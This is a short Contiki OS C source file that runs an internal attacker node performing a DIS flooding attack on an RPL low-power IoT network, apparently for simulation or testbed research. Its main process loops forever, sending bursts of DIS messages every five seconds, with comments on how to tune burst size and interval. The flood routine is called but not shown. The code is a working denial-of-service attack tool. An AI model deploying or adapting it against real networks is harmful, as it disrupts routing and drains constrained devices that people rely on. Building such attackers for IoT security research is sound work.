/*
 * This file is a wrapper to initialize and run an internal attacker node that performs a DIS flooding attack. The node joins the RPL network and participates in RPL operations (sending DISs, DIOs, DAOs, and DIO-ACKs).
 */

#include "contiki.h"
#include "rpl-icmp6.h"

PROCESS(rpl_icmp6_client_process, "RPL ICMP6 Client Process");
PROCESS(dis_flood_process, "DIS Flood Process");
AUTOSTART_PROCESSES(&rpl_icmp6_client_process, &dis_flood_process);

/* Define a timer for DIS flooding */
static struct etimer dis_flood_timer;

/* Number of DIS messages to send in each burst */
#define DIS_BURST_COUNT 3 // change this to control how many DIS messages to send in each burst

PROCESS_THREAD(rpl_icmp6_client_process, ev, data)
{
  PROCESS_BEGIN();

  rpl_icmp6_init();  // Start ICMP6 client process

  PROCESS_END();
}

PROCESS_THREAD(dis_flood_process, ev, data)
{
  PROCESS_BEGIN();

  /* Initialize the DIS flooding timer - send bursts every 5 seconds */
  etimer_set(&dis_flood_timer, CLOCK_SECOND * 5); // change the second argument to control the interval between bursts

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(ev == PROCESS_EVENT_TIMER);
    
    /* Send multiple DIS messages in a burst */
    for(int i = 0; i < DIS_BURST_COUNT; i++) {
      send_dis_flood();
    }
    
    /* Reset timer for next burst */
    etimer_reset(&dis_flood_timer);
  }

  PROCESS_END();
}

